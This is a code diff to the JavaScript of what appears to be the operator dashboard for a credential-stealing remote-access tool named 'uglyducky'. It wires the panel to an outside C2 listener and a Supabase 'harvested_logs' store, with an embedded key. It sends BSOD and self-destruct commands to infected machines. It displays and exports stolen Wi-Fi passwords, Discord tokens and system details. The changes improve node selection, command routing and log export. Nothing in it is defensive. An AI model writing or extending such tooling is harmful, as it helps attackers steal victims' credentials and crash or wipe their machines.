@@ -2,7 +2,7 @@
 // ==================================================================
 // --- CONFIGURATION - PASTE YOUR URLS AND KEYS HERE ---
 // ==================================================================
-const C2_LISTENER_URL = "https://uglyducky-c2.onrender.com"; // Your Render URL
+const C2_LISTENER_URL = "https://uglyducky-c2-listener.onrender.com"; // [FIXED] Your actual Render URL
 
 const SUPABASE_URL = "https://azonyysxbizkykdowsma.supabase.co/rest/v1/harvested_logs";
 const SUPABASE_KEY = "sb_publishable_-LlPFHiz2oLK4jhP6tIwOw_88BiAcIg";
@@ -10,6 +10,7 @@ const SUPABASE_KEY = "sb_publishable_-LlPFHiz2oLK4jhP6tIwOw_88BiAcIg";
 
 // --- GLOBAL STATE ---
 let activeNodeId = "DESKTOP-Q1A2Z"; // Default target
+let globalData = []; // To store fetched logs for exporting
 
 // --- MOCK DATA FOR C2 DASHBOARD ---
 const mockNodes = [
@@ -28,6 +29,7 @@ document.addEventListener("DOMContentLoaded", () => {
     initResizers(); // Init Gutters
     renderNodesList(); // Render Left Panel
     renderMap(); // Render Geo Map
+    selectNode(activeNodeId); // Set initial active node in UI
 });
 
 
@@ -68,7 +70,11 @@ window.triggerScorchedEarth = function() {
 };
 
 window.triggerBSOD = function() {
-    sendCommandToNode(activeNodeId, "BSOD");
+    if (confirm(`This will force a Blue Screen of Death (BSOD) on ${activeNodeId}. The target system will immediately crash.\n\nAre you sure you want to continue?`)) {
+        sendCommandToNode(activeNodeId, "BSOD");
+    } else {
+        showToast("BSOD command aborted.", "error");
+    }
 };
 
 
@@ -265,13 +271,17 @@ function renderNodesList() {
 
     mockNodes.forEach(node => {
         let dotColor = node.status === 'green' ? 'bg-green-500' : (node.status === 'red' ? 'bg-red-500' : 'bg-yellow-500');
-        let opacity = node.status === 'red' ? 'opacity-60 cursor-not-allowed' : 'cursor-pointer hover:bg-white/5 border-gray-800';
-        let activeBorder = node.status === 'green' ? 'border border-neon bg-neon/5' : 'border border-gray-800 bg-[#050810]';
-        let activeLine = node.status === 'green' ? '<div class="absolute left-0 top-0 bottom-0 w-1 bg-neon"></div>' : '';
+        let isClickable = node.status !== 'red';
+        let containerClasses = isClickable 
+            ? 'cursor-pointer hover:bg-white/5 border-gray-800' 
+            : 'opacity-60 cursor-not-allowed';
+        let activeBorder = node.id === activeNodeId && isClickable ? 'border border-neon bg-neon/5' : 'border border-gray-800 bg-[#050810]';
+        let activeLine = node.id === activeNodeId && isClickable ? '<div class="absolute left-0 top-0 bottom-0 w-1 bg-neon"></div>' : '';
         let pulse = node.status === 'green' ? 'animate-pulse' : '';
+        let clickAction = isClickable ? `onclick="selectNode('${node.id}')"` : '';
 
         container.innerHTML += `
-            <div class="p-3 ${activeBorder} rounded-lg relative overflow-hidden group transition-all ${opacity}" onclick="activeNodeId='${node.id}'; termLog('Selected node: ${node.id}')">
+            <div class="p-3 ${activeBorder} rounded-lg relative overflow-hidden group transition-all ${containerClasses}" ${clickAction}>
                 ${activeLine}
                 <div class="flex justify-between items-start mb-2 pl-2">
                     <div class="flex items-center gap-2">
@@ -311,6 +321,19 @@ function renderMap() {
     });
 }
 
+// [NEW] Function to handle node selection
+window.selectNode = function(nodeId) {
+    activeNodeId = nodeId;
+    termLog(`Selected node: ${nodeId}`);
+    
+    // Update UI elements
+    document.getElementById('terminal-connection-msg').innerText = `Connected to ${nodeId} via reverse TCP`;
+    document.getElementById('fs-active-node').innerText = nodeId;
+
+    // Re-render the nodes list to show the new active selection
+    renderNodesList();
+};
+
 // ==========================================
 // TERMINAL LOGIC
 // ==========================================
@@ -336,7 +359,11 @@ window.executeTermCommand = function(inputEl) {
         // If they type a known command, route it to Render
         if(val.toUpperCase() === 'BSOD' || val.toUpperCase() === 'BURN') {
             termLog(`Forwarding command to C2 server...`);
-            sendCommandToNode(activeNodeId, val.toUpperCase() === 'BURN' ? 'SELF_DESTRUCT' : 'BSOD');
+            if (val.toUpperCase() === 'BURN') {
+                sendCommandToNode(activeNodeId, "SELF_DESTRUCT");
+            } else {
+                sendCommandToNode(activeNodeId, "BSOD");
+            }
         } else {
             termLog(`'${val}' executed locally (MOCK).`);
         }
@@ -383,8 +410,6 @@ document.getElementById('fileUploadInput').onchange = function(e) { if(e.target.
 // ==========================================
 // DATA EXTRACTION (Vault Mock/Fetch)
 // ==========================================
-let globalData = [];
-
 document.getElementById("deviceId").addEventListener("keypress", function(e) {
     if (e.key === "Enter") { e.preventDefault(); fetchData(); }
 });
@@ -414,11 +439,12 @@ window.fetchData = async function() {
         });
 
         if (!response.ok) throw new Error("API Error");
-        globalData = await response.json();
+        const data = await response.json();
 
-        if (globalData.length === 0) {
-            throw new Error("Empty Array"); // Trigger fallback mock inject
+        if (data.length === 0) {
+            throw new Error("Empty Array");
         } else {
+            globalData = data;
             statusMsg.innerHTML = `<i class="fa-solid fa-lock-open text-green-500 mr-2"></i>Vault Decrypted. [${globalData.length} records]`;
             exportBtn.classList.remove('hidden');
             buildFilters();
@@ -426,7 +452,6 @@ window.fetchData = async function() {
             showToast("Vault Extracted Successfully");
         }
     } catch (error) {
-        // FAILSAFE: INJECT MOCK DATA IF DB FAILS SO UI IS TESTABLE
         statusMsg.innerHTML = `<i class="fa-solid fa-triangle-exclamation text-yellow-500 mr-2"></i>API Failed or Empty. Injecting mock objects for UI testing...`;
         globalData = [
             { category: 'Wi-Fi Networks', created_at: new Date().toISOString(), content: "SSID: Home_Network_5G\nPASS: supersecret123\n----------\nSSID: Starbucks_Guest\nPASS: \n" },
@@ -434,6 +459,7 @@ window.fetchData = async function() {
             { category: 'System Info', created_at: new Date().toISOString(), content: "OS: Windows 11 Pro\nCPU: Intel Core i7-10700K\nRAM: 32 GB\nGPU: NVIDIA RTX 3080\nIP: 192.168.1.44" },
             { category: 'Discord Tokens', created_at: new Date().toISOString(), content: "SOURCE: Discord PTB\nTOKEN: mfa.1234567890abcdefghijklmnopqrstuvwxyz_ABCDEFGHIJKLMNOPQRSTUVWXYZ" }
         ];
+        exportBtn.classList.remove('hidden');
         buildFilters();
         renderCards(globalData, outputDiv);
         showToast("Mock Data Loaded", "success");
@@ -560,4 +586,24 @@ window.copyData = function(btnElement) {
         icon.className = "fa-solid fa-check text-green-400";
         setTimeout(() => icon.className = "fa-regular fa-copy", 2000);
     });
+};
+
+// [NEW] Function to export logs as JSON
+window.exportLogs = function() {
+    if (globalData.length === 0) {
+        showToast("No data to export.", "error");
+        return;
+    }
+    const deviceId = document.getElementById('deviceId').value.trim() || 'export';
+    const jsonData = JSON.stringify(globalData, null, 2);
+    const blob = new Blob([jsonData], { type: 'application/json' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `uglyducky-logs-${deviceId}.json`;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+    showToast("Logs exported as JSON file.");
 };
